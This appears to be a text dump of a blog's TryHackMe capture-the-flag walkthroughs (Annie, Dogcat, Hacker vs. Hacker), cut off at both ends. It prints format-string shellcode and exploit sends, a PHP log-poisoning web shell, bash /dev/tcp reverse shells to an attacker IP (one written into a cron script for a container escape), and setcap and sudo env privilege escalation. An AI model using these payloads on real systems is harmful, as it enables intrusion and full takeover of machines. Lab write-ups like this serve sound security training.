b\u0026#34;\\x8d\\x05\\xef\\xff\\xff\\xff\\x48\\xbb\\xf1\\x7c\\x94\u0026#34; shellcode += b\u0026#34;\\xa2\\x97\\xa9\\x17\\x7b\\x48\\x31\\x58\\x27\\x48\\x2d\u0026#34; shellcode += b\u0026#34;\\xf8\\xff\\xff\\xff\\xe2\\xf4\\x9b\\x55\\xcc\\x3b\\xfd\u0026#34; shellcode += b\u0026#34;\\xab\\x48\\x11\\xf0\\x22\\x9b\\xa7\\xdf\\x3e\\x5f\\xc2\u0026#34; shellcode += b\u0026#34;\\xf3\\x7c\\x95\\x19\\x9d\\xa1\\xdf\\x49\\xa0\\x34\\x1d\u0026#34; shellcode += b\u0026#34;\\x44\\xfd\\xb9\\x4d\\x11\\xdb\\x24\\x9b\\xa7\\xfd\\xaa\u0026#34; shellcode += b\u0026#34;\\x49\\x33\\x0e\\xb2\\xfe\\x83\\xcf\\xa6\\x12\\x0e\\x07\u0026#34; shellcode += b\u0026#34;\\x16\\xaf\\xfa\\x0e\\xe1\\xac\\x54\\x93\\x15\\xfa\\x8d\u0026#34; shellcode += b\u0026#34;\\xe4\\xc1\\x17\\x28\\xb9\\xf5\\x73\\xf0\\xc0\\xe1\\x9e\u0026#34; shellcode += b\u0026#34;\\x9d\\xfe\\x79\\x94\\xa2\\x97\\xa9\\x17\\x7b\u0026#34;  print(\u0026#39;sending payload ...\u0026#39;) p = gen_discover_packet(4919, 1, \u0026#39;\\x85\\xfe%1$*1$x%18x%165$ln\u0026#39;+shellcode, \u0026#39;\\x85\\xfe%18472249x%93$ln\u0026#39;, \u0026#39;ad\u0026#39;, \u0026#39;main\u0026#39;) s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) s.sendto(p, (ip, port)) s.close() print(\u0026#39;reverse shell should connect within 5 seconds\u0026#39;)   Command: python2 49613.py  geobour98@kali:~$ python2 49613.py sending payload ... reverse shell should connect within 5 seconds Before running it, open a netcat listener on 443 port.\ngeobour98@kali:~$ nc -lvnp 443 connect to [10.8.200.50] from (UNKNOWN) [10.10.235.134] 60890 python3 -c \u0026#39;import pty;pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39; annie@desktop:/home/annie$ id uid=1000(annie) gid=1000(annie) groups=1000(annie),24(cdrom),27(sudo),30(dip),46(plugdev),111(lpadmin),112(sambashare) annie@desktop:/home/annie$ cat user.txt THM{[REDACTED]} Now we are the user annie and can read the user.txt flag.\nPrivilege Escalation Download linpeas.sh from PEASS-ng github page (https://github.com/carlospolop/PEASS-ng/releases/tag/20220821) and transfer it to the victim machine.\nannie@desktop:/home/annie$ chmod +x linpeas.sh annie@desktop:/home/annie$ ./linpeas.sh [REDACTED] ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ï£ Interesting Files ‚ï†‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê ‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ï£ SUID - Check easy privesc, exploits and write perms ‚ïö https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid -rwsr-xr-x 1 root root 10K Nov 16 2017 /sbin/setcap (Unknown SUID binary) [REDACTED] There is an interesting SUID /sbin/setcap. It is used to assign or remove capabilities. We can use it to assign capabilities to /home/annie/python3.6 which will be a copy of /usr/bin/python3.6.\nannie@desktop:/home/annie$ cp /usr/bin/python3.6 . annie@desktop:/home/annie$ setcap cap_setuid+ep /home/annie/python3.6 annie@desktop:/home/annie$ getcap -r / 2\u0026gt;/dev/null /home/annie/python3.6 = cap_setuid+ep /usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep /usr/bin/mtr-packet = cap_net_raw+ep /usr/bin/gnome-keyring-daemon = cap_ipc_lock+ep annie@desktop:/home/annie$ ./python3.6 -c \u0026#39;import os; os.setuid(0); os.system(\u0026#34;/bin/bash\u0026#34;)\u0026#39; root@desktop:/home/annie# id uid=0(root) gid=1000(annie) groups=1000(annie),24(cdrom),27(sudo),30(dip),46(plugdev),111(lpadmin),112(sambashare) root@desktop:/root# cat root.txt THM{[REDACTED]} This process can be found in this great article: https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/\nProof of Concept (PoC image): ","permalink":"https://geobour98.com/write-ups/thm/annie/","summary":"üìÜ 27/08/2022 - geobour98 ‚åö 6 min\nIntroduction This is a TryHackMe room which can be found at: Annie\nRemote access comes in different flavors.\nReconnaissance \u0026amp; Scanning Perform nmap scan to identify open ports and services.\n  Command: nmap -p- -T4 -v 10.10.235.134  geobour98@kali:~$ nmap -p- -T4 -v 10.10.235.134 Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-27 13:40 EEST Initiating Ping Scan at 13:40 Scanning 10.10.235.134 [2 ports] Completed Ping Scan at 13:40, 0.","title":"TryHackMe - Annie"},{"content":"üìÜ 31/10/2022 - geobour98 ‚åö 7 min\nIntroduction This is a TryHackMe room which can be found at: Dogcat\nI made a website where you can look at pictures of dogs and/or cats! Exploit a PHP application via LFI and break out of a docker container.\nReconnaissance \u0026amp; Scanning Perform nmap scan to identify open ports and services.\n  Command: nmap -p- -T4 -v 10.10.202.202  geobour98@kali:~$ nmap -p- -T4 -v 10.10.202.202 Starting Nmap 7.93 ( https://nmap.org ) at 2022-10-30 09:27 EET Initiating Ping Scan at 09:27 Scanning 10.10.202.202 [2 ports] Completed Ping Scan at 09:27, 0.08s elapsed (1 total hosts) Initiating Parallel DNS resolution of 1 host. at 09:27 Completed Parallel DNS resolution of 1 host. at 09:27, 0.00s elapsed Initiating Connect Scan at 09:27 Scanning 10.10.202.202 (10.10.202.202) [65535 ports] Discovered open port 80/tcp on 10.10.202.202 Discovered open port 22/tcp on 10.10.202.202 Completed Connect Scan at 09:28, 58.93s elapsed (65535 total ports) Nmap scan report for 10.10.202.202 (10.10.202.202) Host is up (0.074s latency). Not shown: 65532 closed tcp ports (conn-refused) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 49592/tcp filtered unknown  Read data files from: /usr/bin/../share/nmap Nmap done: 1 IP address (1 host up) scanned in 59.04 seconds Perform aggressive nmap scan to enable OS detection, default scripts and version detection on the found ports.\n  Command: sudo nmap -A -sC -p 22,80,49592 -v 10.10.202.202  geobour98@kali:~$ sudo nmap -A -sC -p 22,80,49592 -v 10.10.202.202 Starting Nmap 7.93 ( https://nmap.org ) at 2022-10-30 09:29 EET NSE: Loaded 155 scripts for scanning. NSE: Script Pre-scanning. Initiating NSE at 09:29 Completed NSE at 09:29, 0.00s elapsed Initiating NSE at 09:29 Completed NSE at 09:29, 0.00s elapsed Initiating NSE at 09:29 Completed NSE at 09:29, 0.00s elapsed Initiating Ping Scan at 09:29 Scanning 10.10.202.202 [4 ports] Completed Ping Scan at 09:29, 0.12s elapsed (1 total hosts) Initiating Parallel DNS resolution of 1 host. at 09:29 Completed Parallel DNS resolution of 1 host. at 09:29, 0.00s elapsed Initiating SYN Stealth Scan at 09:29 Scanning 10.10.202.202 (10.10.202.202) [3 ports] Discovered open port 22/tcp on 10.10.202.202 Discovered open port 80/tcp on 10.10.202.202 Completed SYN Stealth Scan at 09:29, 0.10s elapsed (3 total ports) Initiating Service scan at 09:29 Scanning 2 services on 10.10.202.202 (10.10.202.202) Completed Service scan at 09:29, 6.15s elapsed (2 services on 1 host) Initiating OS detection (try #1) against 10.10.202.202 (10.10.202.202)  Retrying OS detection (try #2) against 10.10.202.202 (10.10.202.202) Retrying OS detection (try #3) against 10.10.202.202 (10.10.202.202) Retrying OS detection (try #4) against 10.10.202.202 (10.10.202.202) Retrying OS detection (try #5) against 10.10.202.202 (10.10.202.202) Initiating Traceroute at 09:29 Completed Traceroute at 09:29, 0.09s elapsed Initiating Parallel DNS resolution of 1 host. at 09:29 Completed Parallel DNS resolution of 1 host. at 09:29, 0.00s elapsed NSE: Script scanning 10.10.202.202. Initiating NSE at 09:29 Completed NSE at 09:29, 3.97s elapsed Initiating NSE at 09:29 Completed NSE at 09:29, 0.32s elapsed Initiating NSE at 09:29 Completed NSE at 09:29, 0.00s elapsed Nmap scan report for 10.10.202.202 (10.10.202.202) Host is up (0.100s latency).  PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 2431192ab1971a044e2c36ac840a7587 (RSA) | 256 213d461893aaf9e7c9b54c0f160b71e1 (ECDSA) |_ 256 c1fb7d732b574a8bdcd76f49bb3bd020 (ED25519) 80/tcp open http Apache httpd 2.4.38 ((Debian)) |_http-title: dogcat |_http-server-header: Apache/2.4.38 (Debian) | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS 49592/tcp closed unknown No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). Navigate to port 80, and notice the URLs for dogs images: http://10.10.202.202/?view=dog and cats images: http://10.10.202.202/?view=cat. Also, from Wappalyzer we identify that PHP is used.\n  Command: gobuster dir -u http://10.10.202.202/ -x php -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 40  geobour98@kali:~$ gobuster dir -u http://10.10.202.202/ -x php -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 40 =============================================================== Gobuster v3.2.0-dev by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.202.202/ [+] Method: GET [+] Threads: 40 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.2.0-dev [+] Extensions: php [+] Timeout: 10s =============================================================== 2022/10/30 09:43:01 Starting gobuster in directory enumeration mode =============================================================== /index.php (Status: 200) [Size: 418] /cat.php (Status: 200) [Size: 26] /flag.php (Status: 200) [Size: 0] /cats (Status: 301) [Size: 309] [--\u0026gt; http://10.10.202.202/cats/] /dogs (Status: 301) [Size: 309] [--\u0026gt; http://10.10.202.202/dogs/] /dog.php (Status: 200) [Size: 26] /server-status (Status: 403) [Size: 276] Progress: 441122 / 441124 (100.00%)=============================================================== 2022/10/30 09:59:03 Finished =============================================================== After poking around we identified that either the string dog or cat must be in the value of the view parameter. If we navigate to the URL: http://10.10.202.202/?view=dog1 we get the following warnings:\nHere you go! Warning: include(dog1.php): failed to open stream: No such file or directory in /var/www/html/index.php on line 24  Warning: include(): Failed opening \u0026#39;dog1.php\u0026#39; for inclusion (include_path=\u0026#39;.:/usr/local/lib/php\u0026#39;) in /var/www/html/index.php on line 24 These warnings reveal that include_path is used, which probably checks for the strings dog or cat.\nExploitation So, it is possible for an LFI to be there, so we will try some payloads from: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion The successful payload is: php://filter/convert.base64-encode/resource=, so the URL becomes: http://10.10.202.202/?view=php://filter/convert.base64-encode/resource=dog resulting to: Here you go!PGltZyBzcmM9ImRvZ3MvPD9waHAgZWNobyByYW5kKDEsIDEwKTsgPz4uanBnIiAvPg0K  Flag 1 We have also found flag.php from gobuster so we can read the 1st flag by navigating to: http://10.10.202.202/?view=php://filter/convert.base64-encode/resource=dog/../flag. The output is: Here you go![REDACTED], which we can decode from base64. We can navigate to: http://10.10.202.202/?view=php://filter/convert.base64-encode/resource=dog/../index in order to view the source code of index.php (if we first decode it from base64):\n\u0026lt;!DOCTYPE HTML\u0026gt; \u0026lt;html\u0026gt;  \u0026lt;head\u0026gt;  \u0026lt;title\u0026gt;dogcat\u0026lt;/title\u0026gt;  \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; type=\u0026#34;text/css\u0026#34; href=\u0026#34;/style.css\u0026#34;\u0026gt; \u0026lt;/head\u0026gt;  \u0026lt;body\u0026gt;  \u0026lt;h1\u0026gt;dogcat\u0026lt;/h1\u0026gt;  \u0026lt;i\u0026gt;a gallery of various dogs or cats\u0026lt;/i\u0026gt;   \u0026lt;div\u0026gt;  \u0026lt;h2\u0026gt;What would you like to see?\u0026lt;/h2\u0026gt;  \u0026lt;a href=\u0026#34;/?view=dog\u0026#34;\u0026gt;\u0026lt;button id=\u0026#34;dog\u0026#34;\u0026gt;A dog\u0026lt;/button\u0026gt;\u0026lt;/a\u0026gt; \u0026lt;a href=\u0026#34;/?view=cat\u0026#34;\u0026gt;\u0026lt;button id=\u0026#34;cat\u0026#34;\u0026gt;A cat\u0026lt;/button\u0026gt;\u0026lt;/a\u0026gt;\u0026lt;br\u0026gt;  \u0026lt;?php function containsStr($str, $substr) { return strpos($str, $substr) !== false; } $ext = isset($_GET[\u0026#34;ext\u0026#34;]) ? $_GET[\u0026#34;ext\u0026#34;] : \u0026#39;.php\u0026#39;; if(isset($_GET[\u0026#39;view\u0026#39;])) { if(containsStr($_GET[\u0026#39;view\u0026#39;], \u0026#39;dog\u0026#39;) || containsStr($_GET[\u0026#39;view\u0026#39;], \u0026#39;cat\u0026#39;)) { echo \u0026#39;Here you go!\u0026#39;; include $_GET[\u0026#39;view\u0026#39;] . $ext; } else { echo \u0026#39;Sorry, only dogs or cats are allowed.\u0026#39;; } } ?\u0026gt;  \u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; We notice that index.php also checks for the ext parameter and if it\u0026rsquo;s missing, it appends .php. So, we can read now the /var/log/apache2/access.log on the URL: http://10.10.202.202/?view=php://filter/convert.base64-encode/resource=dog/../../../../var/log/apache2/access.log\u0026amp;ext (again after decoding from base64). So, we can perform log poisoning in order to execute commands.\ngeobour98@kali:~$ nc -vn 10.10.202.202 80 (UNKNOWN) [10.10.202.202] 80 (http) open GET /\u0026lt;?php system($_GET[\u0026#39;cmd\u0026#39;]); ?\u0026gt; HTTP/1.1 400 Bad Request Date: Sun, 30 Oct 2022 08:30:36 GMT Server: Apache/2.4.38 (Debian) Content-Length: 302 Connection: close Content-Type: text/html; charset=iso-8859-1  \u0026lt;!DOCTYPE HTML PUBLIC \u0026#34;-//IETF//DTD HTML 2.0//EN\u0026#34;\u0026gt; \u0026lt;html\u0026gt;\u0026lt;head\u0026gt; \u0026lt;title\u0026gt;400 Bad Request\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt;\u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;Bad Request\u0026lt;/h1\u0026gt; \u0026lt;p\u0026gt;Your browser sent a request that this server could not understand.\u0026lt;br /\u0026gt; \u0026lt;/p\u0026gt; \u0026lt;hr\u0026gt; \u0026lt;address\u0026gt;Apache/2.4.38 (Debian) Server at 172.17.0.2 Port 80\u0026lt;/address\u0026gt; \u0026lt;/body\u0026gt;\u0026lt;/html\u0026gt; The response has 400 HTTP status code but we can verify that the log poisoning was successful by navigating to: http://10.10.202.202/?view=.dog/../../../../var/log/apache2/access.log\u0026amp;cmd=id\u0026amp;ext The output is: uid=33(www-data) gid=33(www-data) groups=33(www-data), so we now can get a reverse shell through Burp Suite. Refresh this page: http://10.10.202.202/?view=.dog/../../../../var/log/apache2/access.log\u0026amp;cmd=id\u0026amp;ext and Intercept it with Burp. Then replace the id command with bash -c 'exec bash -i \u0026amp;\u0026gt;/dev/tcp/10.8.16.74/443 \u0026lt;\u0026amp;1' but URL-encoded. So the request should look like this:\nGET /?view=.dog/../../../../var/log/apache2/access.log\u0026amp;cmd=bash+-c+\u0026#39;exec+bash+-i+%26\u0026gt;/dev/tcp/10.8.16.74/443+\u0026lt;%261\u0026#39;\u0026amp;ext HTTP/1.1 Host: 10.10.202.202 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Connection: close Upgrade-Insecure-Requests: 1 Then, open a netcat listener and we have a reverse shell as www-data.\ngeobour98@kali:~$ nc -lvnp 443 listening on [any] 443 ... connect to [10.8.16.74] from (UNKNOWN) [10.10.202.202] 54374 bash: cannot set terminal process group (1): Inappropriate ioctl for device bash: no job control in this shell www-data@85e25e675ab4:/var/www/html$ whoami www-data Privilege Escalation After executing the command: sudo -l we see that we can execute /usr/bin/env as root without being asked for root password. We can use the following command to become root: sudo env /bin/sh found on: https://gtfobins.github.io/gtfobins/env/#sudo\nwww-data@85e25e675ab4:/var/www/html$ sudo -l sudo -l Matching Defaults entries for www-data on 85e25e675ab4:  env_reset, mail_badpass,  secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin  User www-data may run the following commands on 85e25e675ab4:  (root) NOPASSWD: /usr/bin/env www-data@85e25e675ab4:/var/www/html$ sudo env /bin/sh sudo env /bin/sh id uid=0(root) gid=0(root) groups=0(root) Flag 2 The 2nd flag can be found in: /var/www/flag2_QMW7JvaY2LvK.txt:\ncd /var/www cat flag2_QMW7JvaY2LvK.txt [REDACTED] Flag 3 The 3rd flag can be found in: /root/flag3.txt:\ncd /root cat flag3.txt [REDACTED] Flag 4 If we navigate to / we see the file .dockerenv meaning that we are in Docker container. There is an interesting file backup.sh in /opt/backups/, which should be executed as a Cron job on the Host machine, because it is executing a tar command. So, we can modify backup.sh in order to get a reverse shell from the Host.\necho \u0026#34;bash -c \u0026#39;exec bash -i \u0026amp;\u0026gt;/dev/tcp/10.8.16.74/443 \u0026lt;\u0026amp;1\u0026#39;\u0026#34; \u0026gt; backup.sh cat backup.sh bash -c \u0026#39;exec bash -i \u0026amp;\u0026gt;/dev/tcp/10.8.16.74/443 \u0026lt;\u0026amp;1\u0026#39; Open a netcat listener on 443 port and wait for the connection.\ngeobour98@kali:~$ nc -lvnp 443 listening on [any] 443 ... connect to [10.8.16.74] from (UNKNOWN) [10.10.202.202] 38480 bash: cannot set terminal process group (3679): Inappropriate ioctl for device bash: no job control in this shell root@dogcat:~# id id uid=0(root) gid=0(root) groups=0(root) root@dogcat:~# cat flag4.txt cat flag4.txt [REDACTED] Now are the root user on the Host machine.\nProof of Concept (PoC image): ","permalink":"https://geobour98.com/write-ups/thm/dogcat/","summary":"üìÜ 31/10/2022 - geobour98 ‚åö 7 min\nIntroduction This is a TryHackMe room which can be found at: Dogcat\nI made a website where you can look at pictures of dogs and/or cats! Exploit a PHP application via LFI and break out of a docker container.\nReconnaissance \u0026amp; Scanning Perform nmap scan to identify open ports and services.\n  Command: nmap -p- -T4 -v 10.10.202.202  geobour98@kali:~$ nmap -p- -T4 -v 10.","title":"TryHackMe - Dogcat"},{"content":"üìÜ 22/08/2022 - geobour98 ‚åö 8 min\nIntroduction This is a TryHackMe room which can be found at: Hacker vs. Hacker\nSomeone has compromised this server already! Can you get in and evade their countermeasures?\nReconnaissance \u0026amp; Scanning Perform nmap scan to identify open ports and services.\n  Command: nmap -p- -T4 -v 10.10.156.143  geobour98@kali:~$ nmap -p- -T4 -v 10.10.156.143 Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-22 21:48 EEST Initiating Ping Scan at 21:48 Scanning 10.10.156.143 [2 ports] Completed Ping Scan at 21:48, 0.10s elapsed (1 total hosts) Initiating Parallel DNS resolution of 1 host. at 21:48 Completed Parallel DNS resolution of 1 host. at 21:48, 0.00s elapsed Initiating Connect Scan at 21:48 Scanning 10.10.156.143 (10.10.156.143) [65535 ports] Discovered open port 22/tcp on 10.10.156.143 Discovered open port 80/tcp on 10.10.156.143 Connect Scan Timing: About 39.43% done; ETC: 21:49 (0:00:48 remaining) Completed Connect Scan at 21:49, 75.01s elapsed (65535 total ports) Nmap scan report for 10.10.156.143 (10.10.156.143) Host is up (0.065s latency). Not shown: 65533 closed tcp ports (conn-refused) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http  Read data files from: /usr/bin/../share/nmap Nmap done: 1 IP address (1 host up) scanned in 75.16 seconds   Command: sudo nmap -A -p 22,80 -v 10.10.156.143  geobour98@kali:~$ sudo nmap -A -p 22,80 -v 10.10.156.143 Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-22 21:50 EEST NSE: Loaded 155 scripts for scanning. NSE: Script Pre-scanning. Initiating NSE at 21:50 Completed NSE at 21:50, 0.00s elapsed Initiating NSE at 21:50 Completed NSE at 21:50, 0.00s elapsed Initiating NSE at 21:50 Completed NSE at 21:50, 0.00s elapsed Initiating Parallel DNS resolution of 1 host. at 21:50 Completed Parallel DNS resolution of 1 host. at 21:50, 0.00s elapsed Initiating SYN Stealth Scan at 21:50 Scanning 10.10.156.143 (10.10.156.143) [2 ports] Discovered open port 22/tcp on 10.10.156.143 Discovered open port 80/tcp on 10.10.156.143 Completed SYN Stealth Scan at 21:50, 0.10s elapsed (2 total ports) Initiating Service scan at 21:50 Scanning 2 services on 10.10.156.143 (10.10.156.143) Completed Service scan at 21:50, 6.21s elapsed (2 services on 1 host) Initiating OS detection (try #1) against 10.10.156.143 (10.10.156.143) Retrying OS detection (try #2) against 10.10.156.143 (10.10.156.143) Initiating Traceroute at 21:50 Completed Traceroute at 21:50, 0.08s elapsed Initiating Parallel DNS resolution of 1 host. at 21:50 Completed Parallel DNS resolution of 1 host. at 21:50, 0.00s elapsed NSE: Script scanning 10.10.156.143. Initiating NSE at 21:50 Completed NSE at 21:50, 2.99s elapsed Initiating NSE at 21:50 Completed NSE at 21:50, 0.27s elapsed Initiating NSE at 21:50 Completed NSE at 21:50, 0.00s elapsed Nmap scan report for 10.10.156.143 (10.10.156.143) Host is up (0.066s latency).  PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 9f:a6:01:53:92:3a:1d:ba:d7:18:18:5c:0d:8e:92:2c (RSA) | 256 4b:60:dc:fb:92:a8:6f:fc:74:53:64:c1:8c:bd:de:7c (ECDSA) |_ 256 83:d4:9c:d0:90:36:ce:83:f7:c7:53:30:28:df:c3:d5 (ED25519) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-title: RecruitSec: Industry Leading Infosec Recruitment | http-methods: |_ Supported Methods: POST OPTIONS HEAD GET |_http-favicon: Unknown favicon MD5: DD1493059959BA895A46C026C39C36EF |_http-server-header: Apache/2.4.41 (Ubuntu) Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Aggressive OS guesses: Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 2.6.32 (92%), Linux 3.1 - 3.2 (92%), Linux 3.11 (92%), Linux 3.2 - 4.9 (92%), Linux 3.7 - 3.10 (92%) No exact OS matches for host (test conditions non-ideal). Uptime guess: 33.377 days (since Wed Jul 20 12:48:00 2022) Network Distance: 2 hops TCP Sequence Prediction: Difficulty=256 (Good luck!) IP ID Sequence Generation: All zeros Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  TRACEROUTE (using port 22/tcp) HOP RTT ADDRESS 1 67.28 ms 10.8.0.1 (10.8.0.1) 2 66.56 ms 10.10.156.143 (10.10.156.143)  NSE: Script Post-scanning. Initiating NSE at 21:50 Completed NSE at 21:50, 0.00s elapsed Initiating NSE at 21:50 Completed NSE at 21:50, 0.00s elapsed Initiating NSE at 21:50 Completed NSE at 21:50, 0.00s elapsed Read data files from: /usr/bin/../share/nmap OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 13.64 seconds  Raw packets sent: 56 (4.084KB) | Rcvd: 40 (3.056KB)   Command: gobuster dir -u http://10.10.156.143/ -x txt,html,php -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -t 40  geobour98@kali:~$ gobuster dir -u http://10.10.151.143/ -x txt,html,php -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -t 40 =============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.156.143/ [+] Method: GET [+] Threads: 40 [+] Wordlist: /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.1.0 [+] Extensions: php,txt,html [+] Timeout: 10s =============================================================== 2022/08/22 21:53:10 Starting gobuster in directory enumeration mode =============================================================== /.htpasswd (Status: 403) [Size: 278] /.htaccess.php (Status: 403) [Size: 278] /.htpasswd.php (Status: 403) [Size: 278] /.htaccess (Status: 403) [Size: 278] /.hta (Status: 403) [Size: 278] /.htpasswd.txt (Status: 403) [Size: 278] /.htaccess.txt (Status: 403) [Size: 278] /.hta.txt (Status: 403) [Size: 278] /.htpasswd.html (Status: 403) [Size: 278] /.htaccess.html (Status: 403) [Size: 278] /.hta.html (Status: 403) [Size: 278] /.hta.php (Status: 403) [Size: 278] /css (Status: 301) [Size: 312] [--\u0026gt; http://10.10.156.143/css/] /cvs (Status: 301) [Size: 312] [--\u0026gt; http://10.10.156.143/cvs/] /dist (Status: 301) [Size: 313] [--\u0026gt; http://10.10.156.143/dist/] /images (Status: 301) [Size: 315] [--\u0026gt; http://10.10.156.143/images/] /index.html (Status: 200) [Size: 3413] /index.html (Status: 200) [Size: 3413] /server-status (Status: 403) [Size: 278] /upload.php (Status: 200) [Size: 552] =============================================================== 2022/08/22 21:54:06 Finished =============================================================== After navigating to port 80 in a web browser, we see an interesting file upload functionality, but nothing happens when we try to upload a file. Then, we navigate to /upload.php and view it\u0026rsquo;s source code:\nHacked! If you dont want me to upload my shell, do better at filtering!  \u0026lt;!-- seriously, dumb stuff:  $target_dir = \u0026#34;cvs/\u0026#34;; $target_file = $target_dir . basename($_FILES[\u0026#34;fileToUpload\u0026#34;][\u0026#34;name\u0026#34;]);  if (!strpos($target_file, \u0026#34;.pdf\u0026#34;)) {  echo \u0026#34;Only PDF CVs are accepted.\u0026#34;; } else if (file_exists($target_file)) {  echo \u0026#34;This CV has already been uploaded!\u0026#34;; } else if (move_uploaded_file($_FILES[\u0026#34;fileToUpload\u0026#34;][\u0026#34;tmp_name\u0026#34;], $target_file)) {  echo \u0026#34;Success! We will get back to you.\u0026#34;; } else {  echo \u0026#34;Something went wrong :|\u0026#34;; }  --\u0026gt; Exploitation A possible vulnerability on strpos() would be to upload a file with .pdf.php extension. But this doesn\u0026rsquo;t work too. Then we search for already uploaded files with this extension in cvs/ directory.\n  Command: gobuster dir -u http://10.10.156.143/cvs/ -x pdf.php -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -t 40  geobour98@kali:~$ gobuster dir -u http://10.10.156.143/cvs/ -x pdf.php -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -t 40 =============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.156.143/cvs/ [+] Method: GET [+] Threads: 40 [+] Wordlist: /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.1.0 [+] Extensions: pdf.php [+] Timeout: 10s =============================================================== 2022/08/22 21:59:29 Starting gobuster in directory enumeration mode =============================================================== /.htaccess (Status: 403) [Size: 278] /.htaccess.pdf.php (Status: 403) [Size: 278] /.htpasswd (Status: 403) [Size: 278] /.htpasswd.pdf.php (Status: 403) [Size: 278] /.hta (Status: 403) [Size: 278] /.hta.pdf.php (Status: 403) [Size: 278] /index.html (Status: 200) [Size: 26] /shell.pdf.php (Status: 200) [Size: 18] =============================================================== 2022/08/22 21:59:57 Finished =============================================================== Just try the basic parameter cmd to check for code execution. The URL is: http://10.10.156.143/cvs/shell.pdf.php?cmd=id and we do have code execution because the output is: uid=33(www-data) gid=33(www-data) groups=33(www-data). In order to get a reverse shell, we intercept that request with Burp proxy, send it to Repeater, and execute a bash reverse shell like the following: bash -c 'exec bash -i \u0026amp;\u0026gt;/dev/tcp/10.8.200.50/443 \u0026lt;\u0026amp;1', but it has to be URL-encoded. The request in Burp should look like this:\nGET /cvs/shell.pdf.php?cmd=bash+-c+\u0026#39;exec+bash+-i+%26\u0026gt;/dev/tcp/10.8.200.50/443+\u0026lt;%261\u0026#39; HTTP/1.1 Host: 10.10.186.151 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Connection: close Upgrade-Insecure-Requests: 1 Cache-Control: max-age=0 Open a netcat listener and we have reverse shell as www-data:\nwww-data@b2r:/var/www/html/cvs$ whoami www-data There is an interesting file .bash_history in user\u0026rsquo;s lachlan home directory (/home/lachlan), which contains the password of that user:\nwww-data@b2r:/home/lachlan$ cat .bash_history ./cve.sh ./cve-patch.sh vi /etc/cron.d/persistence echo -e \u0026#34;dHY5pzmNYoETv7SUaY\\n[REDACTED]\\n[REDACTED]\u0026#34; | passwd ls -sf /dev/null /home/lachlan/.bash_history Next, we become user lachlan with the found password.\n  Command: su lachlan  We can also read the first flag, 